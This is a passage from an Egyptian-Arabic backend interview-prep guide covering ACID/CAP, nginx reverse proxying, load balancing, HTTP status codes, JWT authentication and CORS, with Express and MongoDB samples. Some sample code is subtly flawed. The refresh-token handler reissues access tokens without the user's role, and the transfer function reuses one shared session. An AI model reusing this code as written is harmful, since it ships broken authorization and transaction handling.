**إيه اللي ممكن يغلط؟** الخطوة الأولى حصلت (خصم من حسابك) والسيرفر وقع قبل ما الخطوة التانية تحصل. إنت فقدت 1000 جنيه وصديقك ما استلمش حاجة!

ACID هو الضمان إن ده مش هيحصل:

- **Atomicity (الأتومية):** إما الـ Transaction كلها بتنجح أو كلها بتفشل. مفيش نص نجاح. لو الخطوة التانية فشلت، الخطوة الأولى بتتـ Rollback تلقائياً.

- **Consistency (الاتساق):** البيانات دايماً في حالة Valid. قبل الـ Transaction وبعدها، قواعد الـ Business Logic محترمة. مثلاً رصيدك مش هيبقى سالب لو مفيش Overdraft.

- **Isolation (العزل):** الـ Transactions المتزامنة مش بتشوف بعض. لو إنت وشخص تاني بتعملوا Transactions على نفس الحساب في نفس الوقت، كل Transaction بتحس إنها شغّالة لوحدها.

- **Durability (الديمومة):** لما الـ Transaction تنجح وتيجيك Confirmation، البيانات دي محفوظة للأبد. حتى لو الـ Server وقع بعدها بثانية، البيانات مش بتضيع.

**BASE — الـ NoSQL World:**

لما الـ Systems بدأت تكبر لـ Billions من المستخدمين، ظهر إن ACID بياخد Trade-offs — خصوصاً في الـ Availability والـ Performance على الـ Distributed Systems.

- **Basically Available:** النظام متاح دايماً تقريباً. حتى لو بعض الـ Nodes وقعوا، النظام بيكمل يشتغل وبيرد على الـ Requests.

- **Soft State:** الـ State ممكن يتغير مع الوقت حتى من غير Input جديد — لأن الـ System بيعمل Sync تلقائياً بين الـ Nodes.

- **Eventually Consistent:** البيانات مش بتكون Consistent فوراً في كل مكان، بس في النهاية (Eventually) كل الـ Nodes هتوصل لنفس الـ State. مثلاً في Twitter لما تعمل Post، ممكن بعض الـ Followers يشوفوه بعد ثانية أو تانتين من Followers تانيين — ده Eventual Consistency.

**CAP Theorem:**

Eric Brewer اكتشف إن أي Distributed Database System مقدرش يضمن الثلاثة دول في نفس الوقت:

- **Consistency (C):** كل Request بيرجع بأحدث بيانات أو Error.
- **Availability (A):** كل Request بيرجع بـ Response (مش Error) في وقت معقول.
- **Partition Tolerance (P):** النظام بيشتغل حتى لو في Network Partition (قطع في الاتصال بين الـ Nodes).

في أي Distributed System، الـ Network Partition حاصل هيحصل — ده حاجة خارج إيدك. فعملياً الاختيار بين **CP** أو **AP**:

- **CP Systems (Consistency + Partition Tolerance):** زي HBase، MongoDB (بـ Strong Consistency Mode). لو حصل Network Partition، النظام بيرفض الـ Writes عشان يحافظ على الـ Consistency.

- **AP Systems (Availability + Partition Tolerance):** زي Cassandra، CouchDB. لو حصل Network Partition، النظام بيكمل يقبل Reads والـ Writes وبيعمل Sync بعدين (Eventual Consistency).

---

#### 💻 الكود

```javascript
// ============================================================
// ACID in MongoDB — Multi-document Transactions (MongoDB 4.0+)
// ============================================================

// MongoDB supports multi-document ACID transactions within a replica set
const session = await mongoose.startSession();

async function transferFunds(senderId, receiverId, amount) {
  session.startTransaction({
    readConcern:  { level: "snapshot" },       // Isolation: see consistent snapshot
    writeConcern: { w: "majority", j: true },  // Durability: wait for majority of nodes
  });

  try {
    // Step 1: Deduct from sender's account
    const sender = await Account.findOneAndUpdate(
      { _id: senderId, balance: { $gte: amount } }, // Ensure sufficient balance (Consistency)
      { $inc: { balance: -amount } },
      { session, new: true }                         // Must pass session to be part of the transaction
    );

    if (!sender) throw new Error("Insufficient funds or sender not found");

    // Step 2: Add to receiver's account
    const receiver = await Account.findByIdAndUpdate(
      receiverId,
      { $inc: { balance: amount } },
      { session, new: true }
    );

    if (!receiver) throw new Error("Receiver account not found");

    // Both updates succeeded — commit the transaction (Atomicity: all or nothing)
    await session.commitTransaction();
    return { sender, receiver };

  } catch (error) {
    // Something failed — roll back ALL changes (the deduction from sender is undone)
    await session.abortTransaction(); // Atomicity in action
    throw error;
  } finally {
    session.endSession(); // Always clean up the session
  }
}

// ============================================================
// EVENTUAL CONSISTENCY in practice — what it looks like in code
// ============================================================

// In a distributed system (multiple MongoDB nodes), after a write to the Primary:
// The write is confirmed immediately on the Primary node
// Secondary nodes sync asynchronously (usually within milliseconds)

// If you read from a Secondary node immediately after writing to Primary,
// you MIGHT get stale data — this is Eventual Consistency

const mongoose2 = require("mongoose");

// Force reading from the Primary (Strong Consistency — like ACID)
const freshData = await User.findById(userId).read("primary");

// Allow reading from Secondary (Eventual Consistency — faster, might be slightly stale)
const eventuallyConsistentData = await User.findById(userId).read("secondaryPreferred");

// ============================================================
// Choosing between consistency models in your API design
// ============================================================

// Use Strong Consistency (CP) for:
// - Financial transactions, banking, payments
// - Inventory management (avoid overselling)
// - User authentication (don't want stale session data)

// Use Eventual Consistency (AP) for:
// - Social media likes/views counts
// - Recommendation engines
// - Analytics and reporting
// - User activity feeds
// These can tolerate being slightly stale — availability is more important
```

**[⬆ Back to Top](#)**

---

## 🌐 Part 4 — Basic Networking

---

### 15. إيه الفرق بين الـ Forward Proxy والـ Reverse Proxy؟

---

#### 🧠 الشرح

الاتنين "Proxy" — يعني وسيط — بس الفرق في **مين اللي بيوقف أمامه الـ Proxy ده**.

**Forward Proxy — الوسيط اللي بيمشي معاك:**

تخيّل إنك طالب في جامعة، والجامعة بلوكت مواقع كتير (YouTube، Facebook، إلخ). إنت مش بتكلم الموقع مباشرة — بتكلم الـ Proxy Server الأول، وهو بيكلم الموقع نيابة عنك. الموقع مش بيعرف إنت مين أصلاً — بيعرف بس الـ Proxy.

الـ Forward Proxy بيقف **أمام الـ Clients** ويعمل Requests للـ Internet نيابة عنهم.

**Use Cases:**
- Corporate Firewalls (تحكم في ما يدخل وما لا يدخل)
- Anonymity وـ Privacy (VPNs)
- Caching للـ Frequently Requested Content لتوفير الـ Bandwidth
- Bypassing Geo-restrictions (أقل شيوعاً)

**Reverse Proxy — الوسيط اللي بيحمي الـ Server:**

تخيّل إنك بتيجي لشركة كبيرة. مش بتدخل مباشرة على المكتب اللي إنت جاي فيه — في Receptionist بيستقبلك، بيعرف إنت جاي لمين، وبيوديك للمكتب الصح. المكتب نفسه (Server) مش ظاهر ليك مباشرة.

الـ Reverse Proxy بيقف **أمام الـ Servers** ويستقبل الـ Requests من الـ Clients ويوجّهها للـ Server الصح.

**Use Cases:**
- **Load Balancing:** بيوزع الـ Traffic على عدة Servers
- **SSL Termination:** بيعمل Decrypt للـ HTTPS هنا، والـ Servers الداخلية بتتواصل بـ HTTP عادي
- **Caching:** بيـ Cache الـ Responses عشان ما يوصلش للـ Backend مرة تانية
- **Security:** الـ Servers الحقيقية مش exposed للـ Internet — في حماية
- **Compression:** بيضغط الـ Responses قبل ما يبعتها للـ Client
- **Serving Static Files:** Nginx بيخدم الـ Static Files (HTML, CSS, Images) أسرع بكتير من Node.js

في Production، دايماً هتلاقي Nginx أو Apache أو Cloudflare كـ Reverse Proxy قدام الـ Node.js Application.

---

#### 💻 الكود

```nginx
# ============================================================
# NGINX as a Reverse Proxy for a Node.js Application
# This is a simplified nginx.conf configuration
# ============================================================

# Define the upstream (backend) servers
upstream nodejs_app {
    # Load balancing across 3 Node.js instances (horizontal scaling)
    server 127.0.0.1:3001 weight=3;  # This server gets 3x more traffic (more powerful)
    server 127.0.0.1:3002 weight=1;
    server 127.0.0.1:3003 weight=1;

    # Health check: if a server fails, stop sending it traffic
    keepalive 32; # Keep connections alive to backend servers for performance
}

server {
    listen 80;
    server_name api.myapp.com;

    # Redirect HTTP to HTTPS
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl http2;
    server_name api.myapp.com;

    # SSL Termination — Nginx handles SSL, Node.js doesn't need to
    ssl_certificate     /etc/ssl/certs/myapp.crt;
    ssl_certificate_key /etc/ssl/private/myapp.key;
    ssl_protocols       TLSv1.2 TLSv1.3;

    # Security headers (complement to Helmet.js on the Node side)
    add_header X-Frame-Options "SAMEORIGIN";
    add_header X-Content-Type-Options "nosniff";
    add_header Strict-Transport-Security "max-age=31536000";

    # Serve static files directly from Nginx (much faster than Node.js)
    location /static/ {
        root /var/www/myapp;
        expires 30d;         # Cache static files in browser for 30 days
        add_header Cache-Control "public, immutable";
        gzip on;             # Compress responses
        gzip_types text/css application/javascript image/svg+xml;
    }

    # Proxy API requests to the Node.js backend
    location /api/ {
        proxy_pass         http://nodejs_app;         # Forward to the upstream group
        proxy_http_version 1.1;
        proxy_set_header   Host              $host;
        proxy_set_header   X-Real-IP         $remote_addr;     # Pass real client IP to Node
        proxy_set_header   X-Forwarded-For   $proxy_add_x_forwarded_for;
        proxy_set_header   X-Forwarded-Proto $scheme;          # Pass http or https info
        proxy_set_header   Upgrade           $http_upgrade;    # For WebSocket support
        proxy_set_header   Connection        "upgrade";

        proxy_read_timeout  30s;  # Timeout if backend takes more than 30 seconds
        proxy_connect_timeout 5s;
    }
}
```

```javascript
// ============================================================
// In your Node.js app — reading the real client IP behind a Reverse Proxy
// ============================================================

const express = require("express");
const app = express();

// Tell Express to trust the X-Forwarded-For header from Nginx
// Without this, req.ip will show Nginx's IP (127.0.0.1) instead of the real client IP
app.set("trust proxy", 1); // Trust the first proxy (Nginx)

app.get("/my-ip", (req, res) => {
  // Now req.ip correctly shows the real client IP (not Nginx's IP)
  console.log("Real client IP:", req.ip);
  console.log("Protocol used:", req.protocol); // "https" because of X-Forwarded-Proto
  res.json({ ip: req.ip });
});
```

**[⬆ Back to Top](#)**

---

### 16. إيه هو الـ Load Balancer وإيه الأنواع المختلفة؟

---

#### 🧠 الشرح

تخيّل إنك صاحب مطعم شهير جداً وعندك طوابير من الناس على الباب. قررت إنك بدل ما تكبّر المطعم نفسه، تفتح 3 فروع في نفس الشارع. بس محتاج حد واقف في الشارع يوزّع الزبائن: "إنت روح الفرع 1، إنت الفرع 2، إنت الفرع 3."

ده بالظبط الـ **Load Balancer** — هو الـ "الموزّع" اللي بيوقف قدام عدة Servers ويوزع الـ Requests عليهم.

**ليه محتاجين Load Balancer؟**

**1. Performance وـ Scalability:** بدل ما تعمل Server واحد أقوى (Vertical Scaling — عنده Ceiling)، بتضيف Servers أكتر (Horizontal Scaling — مش عنده Ceiling نظرياً).

**2. High Availability (Zero Downtime):** لو Server واقع أو بيتعمله Maintenance، الـ Load Balancer ببساطة بيبطّل يبعت Requests ليه والـ Servers التانية بتستحمل الـ Load. الـ User مش حاسس بحاجة.

**3. Geographic Distribution:** ممكن يبعت الـ User للـ Server الأقرب ليه جغرافياً عشان Latency أقل.

**أهم Algorithms:**

**Round Robin:**
أبسط Algorithm. بيدوّر على الـ Servers بالترتيب. 1 → 2 → 3 → 1 → 2 → 3. مفيد لو كل الـ Requests متقريباً نفس الحجم وكل الـ Servers بنفس الـ Specs. المشكلة: ما بيراعيش إن Request معين ممكن يكون ثقيل جداً ويخلّي Server مشغول.

**Weighted Round Robin:**
زي Round Robin بس بتدي كل Server وزن. السيرفر الأقوى بياخد وزن أعلى يعني بياخد Request أكتر. الـ Server بـ 16GB RAM بياخد ضعف الـ Requests اللي بياخدها الـ Server بـ 8GB.

**Least Connections:**
بيبعت الـ Request للـ Server اللي عنده أقل عدد من الـ Active Connections. أذكى من Round Robin لأنه يراعي الـ Load الفعلي. مفيد لـ Long-lived Connections زي WebSockets.

**IP Hash:**
بيعمل Hash لـ IP Address الـ Client ويبعته دايماً لنفس الـ Server. ده بيضمن إن نفس الـ Client دايماً بيروح لنفس الـ Server — مفيد للـ Session Affinity (Sticky Sessions).

**Random:**
بيختار Server عشوائياً. بسيط وسريع، وإحصائياً بيوزّع كويس مع كميات كبيرة من الـ Requests.

**أنواع الـ Load Balancers:**

**Layer 4 (Transport Layer):** بيشتغل على مستوى TCP/UDP. بيبص على الـ IP والـ Port بس، مش على محتوى الـ Request. أسرع وأخف.

**Layer 7 (Application Layer):** أذكى بكتير. بيفهم الـ HTTP Protocol. يقدر يعمل Routing بناءً على الـ URL Path، الـ Headers، الـ Cookies. مثلاً: الـ Requests على `/api/images` تروح لـ Image Servers والـ Requests على `/api/data` تروح لـ Data Servers.

---

#### 💻 الكود

```javascript
// ============================================================
// Simulating Load Balancing Algorithms in JavaScript
// (For conceptual understanding — real load balancers are at infra level)
// ============================================================

class LoadBalancer {
  constructor(servers) {
    this.servers    = servers.filter((s) => s.isHealthy); // Only use healthy servers
    this.currentIdx = 0;
  }

  // --- Round Robin ---
  roundRobin() {
    const server = this.servers[this.currentIdx];
    this.currentIdx = (this.currentIdx + 1) % this.servers.length;
    return server;
  }

  // --- Weighted Round Robin ---
  weightedRoundRobin() {
    const totalWeight = this.servers.reduce((sum, s) => sum + s.weight, 0);
    let random = Math.random() * totalWeight;

    for (const server of this.servers) {
      random -= server.weight;
      if (random <= 0) return server;
    }
    return this.servers[this.servers.length - 1]; // Fallback
  }

  // --- Least Connections ---
  leastConnections() {
    return this.servers.reduce((min, server) =>
      server.activeConnections < min.activeConnections ? server : min
    );
  }

  // --- IP Hash (Consistent Hashing) ---
  ipHash(clientIp) {
    // Simple hash function — real implementations use better algorithms (e.g., MurmurHash)
    const hash = clientIp.split(".").reduce((sum, part) => sum + parseInt(part), 0);
    return this.servers[hash % this.servers.length];
  }
}

// ============================================================
// Example Server Objects
// ============================================================

const servers = [
  { id: "server-1", host: "10.0.0.1", port: 3001, weight: 3, activeConnections: 45, isHealthy: true  },
  { id: "server-2", host: "10.0.0.2", port: 3002, weight: 1, activeConnections: 12, isHealthy: true  },
  { id: "server-3", host: "10.0.0.3", port: 3003, weight: 2, activeConnections: 67, isHealthy: false }, // Down!
];

const lb = new LoadBalancer(servers); // Only server-1 and server-2 are used (server-3 is unhealthy)

console.log("Round Robin:       ", lb.roundRobin().id);      // server-1
console.log("Round Robin:       ", lb.roundRobin().id);      // server-2
console.log("Least Connections: ", lb.leastConnections().id); // server-2 (only 12 connections)
console.log("IP Hash 192.168.1.1:", lb.ipHash("192.168.1.1").id); // Always same server for this IP

// ============================================================
// Health Checks — Load Balancer must know if a server is down
// ============================================================

async function healthChecker(servers) {
  const axios = require("axios");

  while (true) { // Run continuously
    for (const server of servers) {
      try {
        // Ping each server's health endpoint
        const response = await axios.get(`http://${server.host}:${server.port}/health`, {
          timeout: 3000, // If no response in 3 seconds, consider it unhealthy
        });
        server.isHealthy = response.status === 200;
      } catch {
        server.isHealthy = false; // Request failed — server is down or overloaded
        console.warn(`⚠️  Server ${server.id} is unhealthy — removing from rotation`);
      }
    }

    // Wait 10 seconds before next health check cycle
    await new Promise((resolve) => setTimeout(resolve, 10000));
  }
}
```

**[⬆ Back to Top](#)**

---

### 17. إيه هي أهم الـ HTTP Status Codes اللي لازم تعرفها وإيه الفرق بين 401 و 403؟

---

#### 🧠 الشرح

الـ HTTP Status Codes هي "رسائل" الـ Server للـ Client بتعبّر عن نتيجة الـ Request. هي ثلاث أرقام، والرقم الأول بيحدد الـ Category.

**الـ Categories الخمس:**

- **1xx — Informational:** "متستنيش، مازلت شاغل." (مش شائع في الـ REST APIs)
- **2xx — Success:** "نجح!" — اللي بنحلم بيه.
- **3xx — Redirection:** "حاجة اتنقلت. روح هناك."
- **4xx — Client Error:** "إنت اللي غلطت!" — الـ Request نفسه فيه مشكلة.
- **5xx — Server Error:** "أنا اللي غلطت!" — الـ Server فيه مشكلة.

**الفرق بين 401 و 403 — السؤال اللي بيجي كتير:**

الاتنين بيترجموا كـ "مش مسموح" بس في فرق مهم في الـ Semantics:

**401 Unauthorized:**
اللي في الاسم "Unauthorized" — بس المعنى الحقيقي هو "Unauthenticated". يعني "مش عارف إنت مين أصلاً." مفيش Token، أو الـ Token غلط، أو الـ Token منتهي. السيرفر مش متأكد هويتك. الحل: تعمل Login أو تجدد الـ Token.

**403 Forbidden:**
"أنا عارف إنت مين، بس مش مسموح ليك تعمل ده." إنت Authenticated (عندك Token صح)، بس مش عندك الـ Permission المطلوبة. مثلاً: User عادي بيحاول يوصل لـ Admin Panel.

**مثال بسيط:**
- في مبنى فيه Security: لو جيت من غير Badge — **401** (مش عارف إنت مين).
- لو عندك Badge بس مش مسموح ليك تدخل الـ Server Room — **403** (عارف إنت مين، بس ممنوع).

---

#### 💻 الكود

```javascript
// ============================================================
// HTTP STATUS CODES — Practical Implementation in Express
// ============================================================

const express = require("express");
const app = express();

// ============================================================
// 2xx — SUCCESS
// ============================================================

// 200 OK — Standard successful response (GET, PUT, PATCH)
app.get("/users", (req, res) => {
  res.status(200).json({ users: [] }); // 200 is the default, but being explicit is good practice
});

// 201 Created — A new resource was successfully created (POST)
app.post("/users", async (req, res) => {
  const user = await User.create(req.body);
  res
    .status(201)
    .location(`/users/${user._id}`) // Location header points to the new resource
    .json({ success: true, data: user });
});

// 204 No Content — Successful, but nothing to return in the body (DELETE)
app.delete("/users/:id", async (req, res) => {
  await User.findByIdAndDelete(req.params.id);
  res.status(204).send(); // No body — send() with no args sends empty response
});

// ============================================================
// 3xx — REDIRECTION
// ============================================================

// 301 Moved Permanently — The URL has changed forever (important for SEO)
app.get("/old-api/users", (req, res) => {
  res.redirect(301, "/api/v2/users");
});

// 302 Found — Temporary redirect (this URL might come back later)
app.get("/maintenance", (req, res) => {
  res.redirect(302, "/maintenance-page.html");
});

// ============================================================
// 4xx — CLIENT ERRORS
// ============================================================

// 400 Bad Request — The request is malformed or has invalid data
app.post("/orders", (req, res) => {
  const { productId, quantity } = req.body;
  if (!productId || !quantity || quantity <= 0) {
    return res.status(400).json({
      error: "Bad Request",
      message: "productId is required and quantity must be a positive number",
    });
  }
  // ... process order
});

// 401 Unauthorized — The user is NOT authenticated (we don't know who they are)
app.get("/profile", (req, res) => {
  const token = req.headers.authorization;
  if (!token) {
    return res.status(401).json({
      error: "Unauthorized",
      message: "Authentication is required. Please provide a valid Bearer token.",
    });
  }
  // ... return profile
});

// 403 Forbidden — The user IS authenticated, but lacks permission
app.delete("/admin/users/:id", requireAuth, (req, res) => {
  // req.user is populated by requireAuth middleware — we know who they are
  if (req.user.role !== "admin") {
    return res.status(403).json({
      error: "Forbidden",
      message: "You do not have permission to delete users. Admin access required.",
    });
  }
  // ... delete user
});

// 404 Not Found — The requested resource doesn't exist
app.get("/users/:id", async (req, res) => {
  const user = await User.findById(req.params.id);
  if (!user) {
    return res.status(404).json({
      error: "Not Found",
      message: `No user found with ID: ${req.params.id}`,
    });
  }
  res.json(user);
});

// 409 Conflict — The request conflicts with existing data (e.g., duplicate email)
app.post("/register", async (req, res) => {
  const existingUser = await User.findOne({ email: req.body.email });
  if (existingUser) {
    return res.status(409).json({
      error: "Conflict",
      message: "An account with this email address already exists.",
    });
  }
  // ... create user
});

// 422 Unprocessable Entity — Valid format, but semantic errors (common for validation)
app.post("/events", (req, res) => {
  const { startDate, endDate } = req.body;
  if (new Date(startDate) >= new Date(endDate)) {
    return res.status(422).json({
      error: "Unprocessable Entity",
      message: "Event end date must be after the start date",
    });
  }
});

// 429 Too Many Requests — Rate limit exceeded
// (Usually handled by rate-limiter middleware automatically)

// ============================================================
// 5xx — SERVER ERRORS
// ============================================================

// 500 Internal Server Error — Something unexpected went wrong on the server
// 502 Bad Gateway — The reverse proxy got an invalid response from the backend
// 503 Service Unavailable — Server is overloaded or undergoing maintenance

// Global error handler — sends 500 for unhandled errors
app.use((err, req, res, next) => {
  console.error(err.stack);
  const statusCode = err.statusCode || 500;
  res.status(statusCode).json({
    error: statusCode === 500 ? "Internal Server Error" : err.message,
  });
});
```

**[⬆ Back to Top](#)**

---

## 🔒 Part 5 — Security & Auth

---

### 18. إيه الفرق بين JWT والـ Sessions وإمتى تختار كل واحد؟

---

#### 🧠 الشرح

ده من أهم الأسئلة في الـ Security Section. عشان تفهم الفرق الحقيقي، لازم تفهم أولاً ليه محتاجين Authentication من الأساس.

الـ HTTP Stateless — يعني كل Request مستقل تماماً. الـ Server مش بيفتكر اللي حصل في الـ Request اللي قبله. لو عملت Login وبعت Request تاني، الـ Server مش عارف إنك إنت اللي عملت Login قبل كده. محتاج طريقة تقوله "أنا Ahmed اللي عمل Login."

**طريقة الـ Sessions — "الـ Counter في المحل":**

تخيّل عندك Counter في محل السوبر ماركت. لما تيجي أول مرة وتسجّل نفسك، بيدوك كارت فيه رقم (Session ID). كل ما تيجي تاني بتديه الرقم، وهو بيبص على ريجستر عنده مكتوب فيه مين صاحب الرقم ده وإيه المشتريات المحجوزة ليه.

- الـ **Session Data** بتتخزّن على الـ **Server** (في Memory، Redis، Database)
- الـ **Client** بياخد بس **Session ID** (عادة في Cookie)
- كل Request، الـ Server بيبص على الـ Session ID، يجيب الـ Session Data، ويعمل Authorization

**طريقة الـ JWT — "جواز السفر":**

جواز السفر بيحتوي على كل معلوماتك فيه — اسمك، جنسيتك، تاريخ الميلاد. لما بتتجوز في أي دولة، الموظف مش بيكلم دولتك الأصلية عشان يتأكد منك — هو بيقرأ الجواز ويتأكد من الـ Signature بتاعته. لو الـ Signature صح، يثق في البيانات.

الـ JWT (JSON Web Token) فيه:
- **Header:** نوع الـ Token والـ Algorithm المستخدم
- **Payload:** الـ Data (userId, role, إلخ) — مش Encrypted، بس Encoded!
- **Signature:** HMAC باستخدام الـ Secret Key — بتأكد إن الـ Token ما اتعدّلش

الـ Server مش بيخزّن حاجة. كل Request، بيتحقق من الـ Signature بس. لو الـ Signature صح، يثق في الـ Data في الـ Payload.

**مقارنة عميقة:**

| | Sessions | JWT |
|---|---|---|
| **الـ State** | Stateful | Stateless |
| **الـ Storage** | Server (Memory/DB) | Client (LocalStorage/Cookie/Memory) |
| **الـ Scalability** | صعب مع Multiple Servers | سهل — أي Server يقدر يتحقق |
| **الـ Revocation** | سهل — امسح الـ Session | صعب — لحد ما يـ Expire |
| **الـ Size** | صغير (ID بس) | أكبر (Base64 Payload) |
| **الـ DB Lookup** | في كل Request | مش محتاج |

**متى تختار Sessions؟**
- لما تحتاج Instant Revocation (Logout فوري، اتسرق Token)
- Financial Apps حيث الـ Security أولوية قصوى
- إنت شغّال على Server واحد بس

**متى تختار JWT؟**
- Microservices Architecture (خدمات منفصلة محتاجة تتأكد من الـ Auth)
- Mobile Apps والـ SPAs
- عندك Multiple Backend Servers ومش عايز تشغّل Centralized Session Store

---

#### 💻 الكود

```javascript
const express = require("express");
const jwt     = require("jsonwebtoken");
const bcrypt  = require("bcrypt");

const app = express();
app.use(express.json());

// ============================================================
// JWT AUTHENTICATION — Full Implementation
// ============================================================

// Secret keys — NEVER hardcode these, use environment variables
const ACCESS_TOKEN_SECRET  = process.env.JWT_ACCESS_SECRET;   // Short-lived token secret
const REFRESH_TOKEN_SECRET = process.env.JWT_REFRESH_SECRET;  // Long-lived token secret

// In-memory store for refresh tokens (use Redis in production!)
const validRefreshTokens = new Set();

// ---- Helper: Generate Tokens ----
function generateTokens(userId, userRole) {
  // Access Token — short-lived (15 minutes)
  // Used for API authentication — if stolen, expires quickly
  const accessToken = jwt.sign(
    { userId, role: userRole },  // Payload — DO NOT include sensitive data (passwords, credit cards)
    ACCESS_TOKEN_SECRET,
    { expiresIn: "15m", issuer: "myapp.com", audience: "myapp-users" }
  );

  // Refresh Token — long-lived (7 days)
  // Used ONLY to get a new access token — stored securely
  const refreshToken = jwt.sign(
    { userId },                  // Minimal payload for refresh tokens
    REFRESH_TOKEN_SECRET,
    { expiresIn: "7d" }
  );

  return { accessToken, refreshToken };
}

// ---- Auth Middleware ----
function verifyAccessToken(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader?.startsWith("Bearer ")) {
    return res.status(401).json({ error: "No valid Authorization header found" });
  }

  const token = authHeader.slice(7); // Remove "Bearer " prefix

  try {
    const decoded = jwt.verify(token, ACCESS_TOKEN_SECRET, {
      issuer:   "myapp.com",
      audience: "myapp-users",
    });
    req.user = decoded; // { userId, role, iat, exp }
    next();
  } catch (err) {
    if (err.name === "TokenExpiredError") {
      return res.status(401).json({ error: "Access token expired. Please refresh." });
    }
    if (err.name === "JsonWebTokenError") {
      return res.status(401).json({ error: "Invalid token signature." });
    }
    next(err); // Unexpected error
  }
}

// ---- Login Endpoint ----
app.post("/auth/login", async (req, res, next) => {
  try {
    const { email, password } = req.body;

    // Find user and explicitly include the passwordHash (which is select: false in schema)
    const user = await User.findOne({ email }).select("+passwordHash");
    if (!user) {
      // Always return the SAME generic error for wrong email or wrong password
      // This prevents "user enumeration" attacks (knowing which emails exist)
      return res.status(401).json({ error: "Invalid email or password" });
    }

    const isPasswordValid = await bcrypt.compare(password, user.passwordHash);
    if (!isPasswordValid) {
      return res.status(401).json({ error: "Invalid email or password" }); // Same message!
    }

    const { accessToken, refreshToken } = generateTokens(user._id, user.role);

    // Store refresh token (in production, store in Redis with user ID as key)
    validRefreshTokens.add(refreshToken);

    // Send refresh token as httpOnly cookie (NOT accessible via JavaScript — XSS protection)
    res.cookie("refreshToken", refreshToken, {
      httpOnly: true,    // Cannot be accessed by JavaScript
      secure:   true,    // Only sent over HTTPS
      sameSite: "Strict",// Only sent for same-site requests (CSRF protection)
      maxAge:   7 * 24 * 60 * 60 * 1000, // 7 days in milliseconds
    });

    // Send access token in response body — client stores in memory (not localStorage)
    res.json({ accessToken, expiresIn: "15m" });
  } catch (err) {
    next(err);
  }
});

// ---- Refresh Token Endpoint ----
app.post("/auth/refresh", (req, res) => {
  const { refreshToken } = req.cookies;

  if (!refreshToken || !validRefreshTokens.has(refreshToken)) {
    return res.status(401).json({ error: "Invalid or revoked refresh token" });
  }

  try {
    const decoded = jwt.verify(refreshToken, REFRESH_TOKEN_SECRET);

    // Rotate the refresh token (optional but recommended for security)
    validRefreshTokens.delete(refreshToken); // Invalidate old refresh token

    const { accessToken, refreshToken: newRefreshToken } = generateTokens(decoded.userId, decoded.role);
    validRefreshTokens.add(newRefreshToken); // Store new refresh token

    res.cookie("refreshToken", newRefreshToken, {
      httpOnly: true, secure: true, sameSite: "Strict",
      maxAge: 7 * 24 * 60 * 60 * 1000,
    });

    res.json({ accessToken, expiresIn: "15m" });
  } catch {
    res.status(401).json({ error: "Refresh token is invalid or expired. Please log in again." });
  }
});

// ---- Logout Endpoint ----
app.post("/auth/logout", (req, res) => {
  const { refreshToken } = req.cookies;
  if (refreshToken) {
    validRefreshTokens.delete(refreshToken); // Revoke the refresh token
  }
  res.clearCookie("refreshToken");
  res.json({ message: "Logged out successfully" });
});

// ---- Protected Route Example ----
app.get("/api/dashboard", verifyAccessToken, (req, res) => {
  res.json({ message: `Welcome, User ${req.user.userId}!`, role: req.user.role });
});
```

**[⬆ Back to Top](#)**

---

### 19. إيه هو الـ CORS ولماذا بيحصل؟ وكيف نحلّه صح؟

---

#### 🧠 الشرح

الـ CORS هو موضوع بيخلّط كتير من الـ Developers المبتدئين لأنهم بيشوفوا الـ Error في الـ Browser وبيفكروا إن المشكلة في الـ Server. بس الحقيقة مختلفة.

**الـ Same-Origin Policy — الـ Browser Police:**

المتصفح (البراوزر) عنده قانون اسمه **Same-Origin Policy**. بيقول: "الـ JavaScript اللي شغّالة على `https://myapp.com` مش مسموح ليها تعمل HTTP Request لـ `https://api.other.com`."

ليه؟ عشان يحمي المستخدم. تخيّل إنك زرت موقع خبيث (`evil.com`). الموقع ده فيه JavaScript بتحاول تعمل Request لـ `bank.com/api/transfer-money`. لو مفيش Same-Origin Policy، الـ JavaScript دي هتقدر تعمل العملية دي بالـ Cookies الـ Authentication بتاعتك اللي موجودة في المتصفح — وتبقى اتسرق!

**إيه هو الـ Origin بالظبط؟**

الـ Origin = Protocol + Domain + Port. الثلاثة لازم يبقوا نفسهم:
- `https://myapp.com:443` و `http://myapp.com:443` — مختلفين (Protocol مختلف)
- `https://myapp.com` و `https://api.myapp.com` — مختلفين (Subdomain مختلف)
- `https://myapp.com:3000` و `https://myapp.com:4000` — مختلفين (Port مختلف)

**الـ CORS — الحل الرسمي:**

الـ CORS (Cross-Origin Resource Sharing) هو Mechanism بيسمح للـ Server إنه يقول للمتصفح: "تمام، هذا الـ Origin معاه إذن يكلمني." ده بيتم عن طريق **HTTP Headers** بيبعتها الـ Server في الـ Response.

الـ Browser بيعمل **Preflight Request** (طلب OPTIONS) قبل الـ Actual Request في حالات معينة عشان يسأل: "هل عندي إذن؟" لو الـ Server رد بالـ Headers الصح، الـ Browser بيكمل الـ Actual Request.

**مهم جداً:** الـ CORS مش Security من جانب الـ Server — ده Browser Enforcement فقط. الـ Postman و cURL ما بياثروش بالـ CORS لأنهم مش Browsers. الـ CORS بيحمي **المستخدمين** مش الـ API. لو عايز تحمي الـ API نفسها، استخدم Authentication.

---

#### 💻 الكود

```javascript
const express = require("express");
const cors    = require("cors");
const app     = express();

// ============================================================
// CORS CONFIGURATION — Different levels of restriction
// ============================================================

// --- Option 1: Allow ALL origins — ONLY for public APIs with no auth ---
// This sets: Access-Control-Allow-Origin: *
// DANGEROUS: Don't use with credentials (cookies, auth headers)
app.use(cors());

// --- Option 2: Allow specific origins — RECOMMENDED for most apps ---
const allowedOrigins = [
  "https://myapp.com",           // Production frontend
  "https://admin.myapp.com",     // Admin panel
  "http://localhost:3000",        // Development frontend
  "http://localhost:5173",        // Vite dev server
];

const corsOptions = {
  origin: (requestOrigin, callback) => {
    // Allow requests with no origin (mobile apps, curl, Postman, server-to-server)
    if (!requestOrigin) return callback(null, true);

    if (allowedOrigins.includes(requestOrigin)) {
      callback(null, true); // Origin is allowed
    } else {
      callback(new Error(`CORS Error: Origin ${requestOrigin} is not allowed`));
    }
  },
  methods:      ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization", "X-Requested-With"],
  exposedHeaders: ["X-Total-Count", "X-Page-Count"], // Headers the browser can access
  credentials:  true,    // Allow cookies to be sent cross-origin (requires specific origin, not "*")
  maxAge:       86400,   // Cache preflight results for 24 hours (reduces OPTIONS requests)
};

app.use(cors(corsOptions));

// --- Option 3: Per-route CORS (different policies for different routes) ---
const publicCors  = cors({ origin: "*" });               // Open for public data
